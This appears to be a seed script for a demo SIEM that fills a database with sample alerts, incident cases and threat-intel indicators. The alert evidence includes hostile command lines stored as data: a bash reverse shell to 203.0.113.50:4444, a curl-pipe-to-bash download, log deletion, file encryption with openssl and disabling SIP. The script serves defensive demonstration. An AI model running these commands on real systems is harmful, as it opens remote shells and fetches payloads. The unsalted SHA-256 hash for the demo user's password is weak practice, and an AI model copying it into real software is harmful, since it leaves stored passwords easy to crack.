"""
Seed demo data for SecurityScarletAI.

Creates realistic sample alerts, cases, threat intel entries,
and suppression rules for portfolio demonstrations.
Idempotent — checks if data exists before inserting.
"""
import asyncio
import hashlib
import random
from datetime import timedelta
from typing import Any

import asyncpg
from src.config.settings import settings

# Deterministic seed for reproducibility
random.seed(42)

# --- Sample data definitions ---

HOSTS = [
    "web-server-01",
    "db-prod-02",
    "macbook-jane",
    "api-gateway-03",
    "dev-workstation-04",
    "bastion-host-05",
    "jenkins-ci-06",
    "redis-cache-07",
]

USERS = [
    "root",
    "admin",
    "jsmith",
    "adevlin",
    "svc_deploy",
    "svc_monitoring",
]

SOURCE_IPS = [
    "203.0.113.50",   # Known attacker IP
    "198.51.100.23",  # Suspicious IP
    "10.0.1.15",      # Internal IP
    "10.0.1.22",      # Internal IP
    "192.168.1.100",  # Internal IP
    "45.33.32.156",   # Scanning IP
    "91.189.214.7",   # Known botnet
]

ALERT_TEMPLATES = [
    # Critical alerts
    {
        "rule_name": "SSH Brute Force Detected",
        "severity": "critical",
        "host_name": "bastion-host-05",
        "description": "8 failed SSH login attempts from 203.0.113.50 within 5 minutes",
        "mitre_tactics": ["TA0006"],
        "mitre_techniques": ["T1110"],
        "evidence": [
            {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "root"},
            {"source_ip": "203.0.113.50", "event_action": "failed", "user_name": "admin"},
        ],
    },
    {
        "rule_name": "Reverse Shell Pattern Detected",
        "severity": "critical",
        "host_name": "web-server-01",
        "description": "Reverse shell pattern detected: bash -i >& /dev/tcp/203.0.113.50/4444",
        "mitre_tactics": ["TA0002"],
        "mitre_techniques": ["T1059"],
        "evidence": [
            {"process_name": "bash", "process_cmdline": "bash -i >& /dev/tcp/203.0.113.50/4444 0>&1"},
        ],
    },
    {
        "rule_name": "LaunchDaemon Persistence Created",
        "severity": "critical",
        "host_name": "macbook-jane",
        "description": "LaunchDaemon plist created: com.malicious.agent.plist",
        "mitre_tactics": ["TA0003"],
        "mitre_techniques": ["T1547"],
        "evidence": [
            {"file_path": "/Library/LaunchDaemons/com.malicious.agent.plist"},
        ],
    },
    {
        "rule_name": "Credential Dumping Attempt",
        "severity": "critical",
        "host_name": "db-prod-02",
        "description": "Mimikatz credential dumping process detected",
        "mitre_tactics": ["TA0006"],
        "mitre_techniques": ["T1003"],
        "evidence": [
            {"process_name": "mimikatz", "user_name": "root"},
        ],
    },
    {
        "rule_name": "XProtect Removal or Modification",
        "severity": "critical",
        "host_name": "macbook-jane",
        "description": "macOS XProtect system files modified or deleted",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1562"],
        "evidence": [
            {"process_name": "rm", "file_path": "/Library/Apple/System/Library/CoreServices/XProtect.bundle"},
        ],
    },
    # High alerts
    {
        "rule_name": "Outbound Connection to Rare/C2 Port",
        "severity": "high",
        "host_name": "web-server-01",
        "description": "Outbound connection to port 4444 from web-server-01",
        "mitre_tactics": ["TA0011"],
        "mitre_techniques": ["T1071"],
        "evidence": [
            {"destination_ip": "203.0.113.50", "destination_port": 4444},
        ],
    },
    {
        "rule_name": "Sensitive File Access",
        "severity": "high",
        "host_name": "db-prod-02",
        "description": "Access to /etc/shadow detected from user svc_deploy",
        "mitre_tactics": ["TA0006"],
        "mitre_techniques": ["T1003"],
        "evidence": [
            {"file_path": "/etc/shadow", "user_name": "svc_deploy"},
        ],
    },
    {
        "rule_name": "SSH Successful Login After Failures",
        "severity": "critical",
        "host_name": "bastion-host-05",
        "description": "Successful SSH login from 203.0.113.50 after multiple failures",
        "mitre_tactics": ["TA0006"],
        "mitre_techniques": ["T1110"],
        "evidence": [
            {"source_ip": "203.0.113.50", "event_action": "success", "user_name": "root"},
        ],
    },
    {
        "rule_name": "Log File Deletion",
        "severity": "critical",
        "host_name": "web-server-01",
        "description": "Log file deletion detected: rm /var/log/auth.log",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1070"],
        "evidence": [
            {"process_name": "rm", "process_cmdline": "rm -f /var/log/auth.log"},
        ],
    },
    {
        "rule_name": "Data Exfiltration Volume",
        "severity": "high",
        "host_name": "api-gateway-03",
        "description": "Large outbound transfer of 2.3GB detected to 198.51.100.23",
        "mitre_tactics": ["TA0010"],
        "mitre_techniques": ["T1048"],
        "evidence": [
            {"source_ip": "10.0.1.15", "destination_ip": "198.51.100.23", "bytes_sent": "2457600000"},
        ],
    },
    {
        "rule_name": "Encoded Command Execution",
        "severity": "high",
        "host_name": "dev-workstation-04",
        "description": "Base64-encoded command execution detected",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1027"],
        "evidence": [
            {"process_name": "bash", "process_cmdline": "echo SGVsbG8= | base64 -d | bash"},
        ],
    },
    {
        "rule_name": "Multiple Account Lockouts",
        "severity": "high",
        "host_name": "bastion-host-05",
        "description": "3 accounts locked from source IP 45.33.32.156",
        "mitre_tactics": ["TA0006"],
        "mitre_techniques": ["T1110"],
        "evidence": [
            {"source_ip": "45.33.32.156", "event_action": "locked"},
        ],
    },
    # Medium alerts
    {
        "rule_name": "C2 Beaconing Pattern",
        "severity": "medium",
        "host_name": "api-gateway-03",
        "description": "Regular-interval outbound connections to 91.189.214.7 every 60 seconds",
        "mitre_tactics": ["TA0011"],
        "mitre_techniques": ["T1071"],
        "evidence": [
            {"destination_ip": "91.189.214.7", "interval_seconds": 60},
        ],
    },
    {
        "rule_name": "Suspicious Process from /tmp",
        "severity": "medium",
        "host_name": "web-server-01",
        "description": "Process execution from /tmp directory detected",
        "mitre_tactics": ["TA0002"],
        "mitre_techniques": ["T1059"],
        "evidence": [
            {"file_path": "/tmp/.hidden_payload", "process_name": ".hidden_payload"},
        ],
    },
    {
        "rule_name": "DNS Tunneling Indicators",
        "severity": "medium",
        "host_name": "jenkins-ci-06",
        "description": "DNS queries with suspiciously long subdomains detected",
        "mitre_tactics": ["TA0011"],
        "mitre_techniques": ["T1071"],
        "evidence": [
            {"destination_port": 53, "query_length": 187},
        ],
    },
    {
        "rule_name": "Privilege Escalation via Sudo",
        "severity": "medium",
        "host_name": "dev-workstation-04",
        "description": "Sudo privilege escalation by user adevlin",
        "mitre_tactics": ["TA0004"],
        "mitre_techniques": ["T1548"],
        "evidence": [
            {"process_name": "sudo", "user_name": "adevlin"},
        ],
    },
    {
        "rule_name": "Cron Job Modification",
        "severity": "medium",
        "host_name": "redis-cache-07",
        "description": "Cron job modification detected",
        "mitre_tactics": ["TA0003"],
        "mitre_techniques": ["T1053"],
        "evidence": [
            {"file_path": "/var/spool/cron/root", "event_action": "modification"},
        ],
    },
    {
        "rule_name": "Lateral Movement - Internal",
        "severity": "medium",
        "host_name": "api-gateway-03",
        "description": "SSH connection from api-gateway-03 to db-prod-02 on port 22",
        "mitre_tactics": ["TA0008"],
        "mitre_techniques": ["T1021"],
        "evidence": [
            {"destination_ip": "10.0.1.22", "destination_port": 22},
        ],
    },
    {
        "rule_name": "Living-off-the-Land Binary Execution",
        "severity": "medium",
        "host_name": "web-server-01",
        "description": "LOLBin execution: curl downloading to /tmp",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1218"],
        "evidence": [
            {"process_name": "curl", "process_cmdline": "curl -o /tmp/payload http://203.0.113.50/payload"},
        ],
    },
    # Low alerts
    {
        "rule_name": "Service Account Anomaly",
        "severity": "low",
        "host_name": "api-gateway-03",
        "description": "Service account svc_monitoring authenticating outside normal hours",
        "mitre_tactics": ["TA0001"],
        "mitre_techniques": ["T1078"],
        "evidence": [
            {"user_name": "svc_monitoring", "event_action": "success"},
        ],
    },
    {
        "rule_name": "Suspicious DNS Query",
        "severity": "low",
        "host_name": "dev-workstation-04",
        "description": "DNS query to suspicious domain d3f3ns3.xyz",
        "mitre_tactics": ["TA0011"],
        "mitre_techniques": ["T1071"],
        "evidence": [
            {"destination_port": 53, "domain": "d3f3ns3.xyz"},
        ],
    },
    {
        "rule_name": "Tor Exit Node Connection",
        "severity": "medium",
        "host_name": "dev-workstation-04",
        "description": "Connection to Tor exit node on port 9050",
        "mitre_tactics": ["TA0011"],
        "mitre_techniques": ["T1090"],
        "evidence": [
            {"destination_port": 9050, "destination_ip": "91.189.214.7"},
        ],
    },
    {
        "rule_name": "Gatekeeper Bypass Attempt",
        "severity": "high",
        "host_name": "macbook-jane",
        "description": "Gatekeeper bypass: xattr removing quarantine attribute",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1553"],
        "evidence": [
            {"process_name": "xattr", "process_cmdline": "xattr -d com.apple.quarantine malicious_app.dmg"},
        ],
    },
    {
        "rule_name": "LaunchAgent Persistence Created",
        "severity": "high",
        "host_name": "macbook-jane",
        "description": "Suspicious LaunchAgent plist created in user directory",
        "mitre_tactics": ["TA0003"],
        "mitre_techniques": ["T1547"],
        "evidence": [
            {"file_path": "/Users/jane/Library/LaunchAgents/com.update.agent.plist"},
        ],
    },
    {
        "rule_name": "Impossible Travel - Distant Logins",
        "severity": "critical",
        "host_name": "bastion-host-05",
        "description": "Login for user jsmith from Tokyo followed by login from New York within 30 minutes",
        "mitre_tactics": ["TA0001"],
        "mitre_techniques": ["T1078"],
        "evidence": [
            {"source_ip": "203.0.113.50", "location": "Tokyo", "second_source_ip": "198.51.100.23", "location2": "New York"},
        ],
    },
    {
        "rule_name": "New Admin Account Creation",
        "severity": "high",
        "host_name": "db-prod-02",
        "description": "New admin account 'deploy_admin' created",
        "mitre_tactics": ["TA0003"],
        "mitre_techniques": ["T1136"],
        "evidence": [
            {"user_name": "deploy_admin", "event_action": "user_created"},
        ],
    },
    {
        "rule_name": "Webshell Creation",
        "severity": "critical",
        "host_name": "web-server-01",
        "description": "PHP file created in web server directory",
        "mitre_tactics": ["TA0003"],
        "mitre_techniques": ["T1505"],
        "evidence": [
            {"file_path": "/var/www/html/shell.php"},
        ],
    },
    {
        "rule_name": "Process Injection Indicator",
        "severity": "high",
        "host_name": "api-gateway-03",
        "description": "ptrace process injection detected",
        "mitre_tactics": ["TA0004"],
        "mitre_techniques": ["T1055"],
        "evidence": [
            {"process_name": "ptrace", "process_cmdline": "ptrace -p 1234"},
        ],
    },
    {
        "rule_name": "Ransomware File Encryption Pattern",
        "severity": "critical",
        "host_name": "redis-cache-07",
        "description": " openssl enc detected encrypting files with .encrypted extension",
        "mitre_tactics": ["TA0040"],
        "mitre_techniques": ["T1486"],
        "evidence": [
            {"process_name": "openssl", "process_cmdline": "openssl enc -aes-256-cbc -in /data/db.rdb -out /data/db.rdb.encrypted"},
        ],
    },
    {
        "rule_name": "Download and Execute Pattern",
        "severity": "high",
        "host_name": "web-server-01",
        "description": "Download-then-execute pattern: curl | bash",
        "mitre_tactics": ["TA0002"],
        "mitre_techniques": ["T1059"],
        "evidence": [
            {"process_name": "bash", "process_cmdline": "bash -c 'curl http://203.0.113.50/payload.sh | bash'"},
        ],
    },
    {
        "rule_name": "API Key Usage from New IP",
        "severity": "medium",
        "host_name": "api-gateway-03",
        "description": "API key authentication from previously unseen IP 45.33.32.156",
        "mitre_tactics": ["TA0001"],
        "mitre_techniques": ["T1078"],
        "evidence": [
            {"source_ip": "45.33.32.156", "event_action": "api_key"},
        ],
    },
    {
        "rule_name": "Binary Replacement or Hijacking",
        "severity": "high",
        "host_name": "db-prod-02",
        "description": "Modification of system binary in /usr/bin",
        "mitre_tactics": ["TA0003"],
        "mitre_techniques": ["T1574"],
        "evidence": [
            {"file_path": "/usr/bin/ps", "event_action": "modification"},
        ],
    },
    {
        "rule_name": "SIP Modification",
        "severity": "critical",
        "host_name": "macbook-jane",
        "description": "Attempt to disable System Integrity Protection",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1562"],
        "evidence": [
            {"process_name": "csrutil", "process_cmdline": "csrutil disable"},
        ],
    },
    {
        "rule_name": "TCC Database Modification",
        "severity": "critical",
        "host_name": "macbook-jane",
        "description": "Modification of macOS TCC permissions database",
        "mitre_tactics": ["TA0005"],
        "mitre_techniques": ["T1562"],
        "evidence": [
            {"file_path": "/Library/Application Support/com.apple.TCC/TCC.db"},
        ],
    },
    {
        "rule_name": "Root Login from Non-Console",
        "severity": "high",
        "host_name": "db-prod-02",
        "description": "Root user login from remote session",
        "mitre_tactics": ["TA0004"],
        "mitre_techniques": ["T1078"],
        "evidence": [
            {"user_name": "root", "source_ip": "203.0.113.50"},
        ],
    },
]

CASES = [
    {
        "title": "SSH Brute Force Attack from 203.0.113.50",
        "description": "Coordinated SSH brute force attack targeting bastion-host-05. Over 200 failed login attempts detected across multiple user accounts. The attack originated from 203.0.113.50 using common dictionary usernames. A successful login was detected following the failures, indicating potential compromise.",
        "severity": "critical",
        "assigned_to": "jsmith",
        "notes": [
            {
                "author": "jsmith",
                "text": "Confirmed brute force pattern. Blocking source IP via pf firewall.",
                "timestamp_offset_hours": -2,
            },
            {
                "author": "jsmith",
                "text": "Verified no lateral movement from compromised account. Password reset initiated for all affected users.",
                "timestamp_offset_hours": -1,
            },
        ],
        "lessons": "Implemented rate limiting on SSH connections (max 5 per minute). Deployed fail2ban with aggressive thresholds. Added source IP to perimeter blocklist.",
        "alert_rule_names": [
            "SSH Brute Force Detected",
            "SSH Successful Login After Failures",
        ],
    },
    {
        "title": "Reverse Shell on Web Server",
        "description": "Web server web-server-01 exhibited reverse shell behavior. A bash process was spawned establishing a TCP connection to external IP 203.0.113.50 on port 4444. This coincided with a webshell.php being detected in the web root, indicating initial compromise through a web application vulnerability.",
        "severity": "critical",
        "assigned_to": "adevlin",
        "notes": [
            {
                "author": "adevlin",
                "text": "Isolated web-server-01 from the network. Forensic image captured. Checking other web servers for the same webshell.",
                "timestamp_offset_hours": -4,
            },
            {
                "author": "adevlin",
                "text": "Confirmed: webshell was uploaded via unpatched file upload vulnerability. All web servers patched.",
                "timestamp_offset_hours": -1,
            },
        ],
        "lessons": "Patch web application file upload vulnerability. Implement WAF rules to block PHP file uploads. Add file integrity monitoring to web directories.",
        "alert_rule_names": [
            "Reverse Shell Pattern Detected",
            "Webshell Creation",
            "Outbound Connection to Rare/C2 Port",
        ],
    },
    {
        "title": "Data Exfiltration Investigation",
        "description": "Unusually large data transfers detected from api-gateway-03 to external IP 198.51.100.23. Over 2.3GB transferred in a single session. Correlation with DNS tunneling attempts from the same host suggests a multi-vector exfiltration campaign.",
        "severity": "high",
        "assigned_to": "jsmith",
        "notes": [
            {
                "author": "jsmith",
                "text": "Confirmed exfiltration via API endpoint /export/all-customers. Revoked associated API key.",
                "timestamp_offset_hours": -6,
            },
        ],
        "lessons": "Implemented API rate limiting and response size limits. Added monitoring for bulk data access patterns. API keys now require IP allowlisting.",
        "alert_rule_names": [
            "Data Exfiltration Volume",
            "API Key Usage from New IP",
            "DNS Tunneling Indicators",
        ],
    },
]

THREAT_INTEL_ENTRIES = [
    {"type": "ip", "value": "203.0.113.50", "source": "abuseipdb", "threat_type": "c2", "confidence": 95,
     "metadata": {"country": "Unknown", " isp": "Example ISP", "total_reports": 1247}},
    {"type": "ip", "value": "198.51.100.23", "source": "otx", "threat_type": "malware", "confidence": 88,
     "metadata": {"country": "Unknown", "malware_family": "Cobalt Strike"}},
    {"type": "ip", "value": "45.33.32.156", "source": "abuseipdb", "threat_type": "scanner", "confidence": 78,
     "metadata": {"country": "Unknown", "total_reports": 567}},
    {"type": "ip", "value": "91.189.214.7", "source": "otx", "threat_type": "botnet", "confidence": 82,
     "metadata": {"country": "Unknown", "botnet_family": "Mirai"}},
    {"type": "domain", "value": "d3f3ns3.xyz", "source": "urlhaus", "threat_type": "phishing", "confidence": 70,
     "metadata": {"url_count": 23}},
    {"type": "domain", "value": "evil-update.com", "source": "otx", "threat_type": "c2", "confidence": 90,
     "metadata": {"malware_family": "Emotet"}},
    {"type": "url", "value": "http://203.0.113.50/payload.sh", "source": "urlhaus", "threat_type": "malware", "confidence": 92,
     "metadata": {"tags": ["shell", "loader"]}},
    {"type": "hash_sha256", "value": "a" * 64, "source": "otx", "threat_type": "malware", "confidence": 85,
     "metadata": {"filename": "payload.bin", "file_type": "ELF"}},
    {"type": "ip", "value": "10.0.0.1", "source": "abuseipdb", "threat_type": "scanner", "confidence": 15,
     "metadata": {"note": "Likely internal scanner, low confidence"}},
    {"type": "domain", "value": "cdn-evil.attacker.com", "source": "urlhaus", "threat_type": "c2", "confidence": 88,
     "metadata": {"malware_family": "Qbot"}},
    {"type": "ip", "value": "172.16.0.50", "source": "otx", "threat_type": "phishing", "confidence": 65,
     "metadata": {"country": "Unknown"}},
    {"type": "hash_md5", "value": "d" * 32, "source": "otx", "threat_type": "malware", "confidence": 80,
     "metadata": {"filename": "mimikatz.exe", "file_type": "PE32"}},
    {"type": "domain", "value": "track.analytics-update.net", "source": "urlhaus", "threat_type": "c2", "confidence": 75,
     "metadata": {"tags": ["tracker", "c2"]}},
    {"type": "ip", "value": "104.21.50.100", "source": "abuseipdb", "threat_type": "phishing", "confidence": 70,
     "metadata": {"country": "Unknown", "total_reports": 342}},
    {"type": "url", "value": "https://evil-update.com/download/app.dmg", "source": "urlhaus", "threat_type": "malware", "confidence": 87,
     "metadata": {"tags": ["macos", "trojan"]}},
]


async def seed() -> None:
    """Seed demo data into the database. Idempotent — checks first."""
    conn = await asyncpg.connect(settings.database_url)
    try:
        # Check if demo data already exists
        existing = await conn.fetchval("SELECT COUNT(*) FROM alerts")
        if existing and existing > 0:
            print(f"⏩  Alerts table already has {existing} rows. Skipping seed.")
            return

        print("🌱 Seeding demo data...")

        # --- Insert alerts ---
        from datetime import datetime, timezone

        now = datetime.now(timezone.utc)
        alert_ids = []

        for i, tmpl in enumerate(ALERT_TEMPLATES):
            alert_time = now - timedelta(hours=random.randint(1, 48), minutes=random.randint(0, 59))
            row = await conn.fetchrow(
                """
                INSERT INTO alerts (
                    rule_name, severity, status, host_name, description,
                    mitre_tactics, mitre_techniques, evidence, time, risk_score
                ) VALUES ($1, $2::alert_severity, $3::alert_status, $4, $5, $6, $7, $8, $9, $10)
                RETURNING id
                """,
                tmpl["rule_name"],
                tmpl["severity"],
                random.choice(["new", "investigating", "resolved", "new", "new"]),
                tmpl["host_name"],
                tmpl["description"],
                tmpl.get("mitre_tactics", []),
                tmpl.get("mitre_techniques", []),
                str(tmpl["evidence"]).replace("'", '"'),  # JSONB
                alert_time,
                random.uniform(30, 95) if tmpl["severity"] in ("critical", "high") else random.uniform(10, 50),
            )
            alert_ids.append(row["id"])

        print(f"   ✅ Inserted {len(alert_ids)} alerts")

        # --- Insert cases ---
        for i, case_tmpl in enumerate(CASES):
            case_time = now - timedelta(hours=random.randint(6, 72))
            notes = case_tmpl.get("notes", [])
            notes_json = [
                {
                    "author": n["author"],
                    "text": n["text"],
                    "timestamp": (now + timedelta(hours=n["timestamp_offset_hours"])).isoformat(),
                }
                for n in notes
            ]

            # Find matching alert IDs
            case_alert_ids = []
            for j, tmpl in enumerate(ALERT_TEMPLATES):
                if tmpl["rule_name"] in case_tmpl.get("alert_rule_names", []):
                    case_alert_ids.append(alert_ids[j])

            severity_map = {"critical": "critical", "high": "high", "medium": "medium"}
            status_map = {0: "open", 1: "in_progress", 2: "resolved"}

            case_row = await conn.fetchrow(
                """
                INSERT INTO cases (
                    title, description, severity, status, assigned_to,
                    notes, alert_ids, created_at, updated_at
                ) VALUES ($1, $2, $3::alert_severity, $4::case_status, $5, $6, $7, $8, $9)
                RETURNING id
                """,
                case_tmpl["title"],
                case_tmpl["description"],
                case_tmpl["severity"],
                status_map.get(i, "open"),
                case_tmpl.get("assigned_to"),
                str(notes_json),
                case_alert_ids,
                case_time,
                now,
            )

            # Update alerts to reference this case
            if case_alert_ids:
                case_id = case_row["id"]
                await conn.execute(
                    "UPDATE alerts SET case_id = $1 WHERE id = ANY($2)",
                    case_id,
                    case_alert_ids,
                )

            # Add lessons learned note if present
            if case_tmpl.get("lessons"):
                existing_notes = await conn.fetchval(
                    "SELECT notes FROM cases WHERE id = $1", case_row["id"]
                )
                import json

                notes_list = json.loads(existing_notes) if existing_notes else []
                notes_list.append(
                    {
                        "author": "system",
                        "text": f"LESSON LEARNED: {case_tmpl['lessons']}",
                        "timestamp": now.isoformat(),
                    }
                )
                await conn.execute(
                    "UPDATE cases SET notes = $1::jsonb WHERE id = $2",
                    json.dumps(notes_list),
                    case_row["id"],
                )

        print(f"   ✅ Inserted {len(CASES)} cases")

        # --- Insert threat intel ---
        for ti in THREAT_INTEL_ENTRIES:
            await conn.execute(
                """
                INSERT INTO threat_intel (ioc_type, ioc_value, source, threat_type, confidence, metadata)
                VALUES ($1, $2, $3, $4, $5, $6::jsonb)
                ON CONFLICT (ioc_type, ioc_value, source) DO NOTHING
                """,
                ti["type"],
                ti["value"],
                ti["source"],
                ti.get("threat_type"),
                ti.get("confidence", 50),
                str(ti.get("metadata", {})).replace("'", '"'),
            )

        print(f"   ✅ Inserted {len(THREAT_INTEL_ENTRIES)} threat intel entries")

        # --- Insert demo user ---
        password_hash = hashlib.sha256(b"demo analyst password").hexdigest()
        try:
            await conn.execute(
                """
                INSERT INTO siem_users (username, email, password_hash, role, is_active)
                VALUES ($1, $2, $3, $4, $5)
                ON CONFLICT (username) DO NOTHING
                """,
                "demo_analyst",
                "analyst@scarletai.demo",
                password_hash,
                "analyst",
                True,
            )
            print("   ✅ Inserted demo user (demo_analyst)")
        except Exception:
            print("   ⏩  Demo user already exists, skipping")

        print("\n✨ Demo data seeding complete!")
        print(f"   {len(alert_ids)} alerts across all severity levels")
        print(f"   {len(CASES)} cases with notes and lessons learned")
        print(f"   {len(THREAT_INTEL_ENTRIES)} threat intel entries")

    finally:
        await conn.close()


if __name__ == "__main__":
    asyncio.run(seed())